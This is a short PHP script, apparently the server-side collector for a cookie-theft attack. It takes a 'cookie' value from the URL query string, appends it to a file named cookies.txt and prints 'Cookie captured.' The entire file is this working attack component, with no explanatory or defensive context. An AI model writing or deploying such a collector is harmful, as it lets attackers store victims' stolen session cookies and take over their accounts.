<?php

if (isset($_GET["cookie"])) {

    $cookie = $_GET["cookie"];

    file_put_contents(
        "cookies.txt",
        $cookie . PHP_EOL,
        FILE_APPEND
    );

    echo "Cookie captured.";

} else {

    echo "No cookie received.";
}

?>
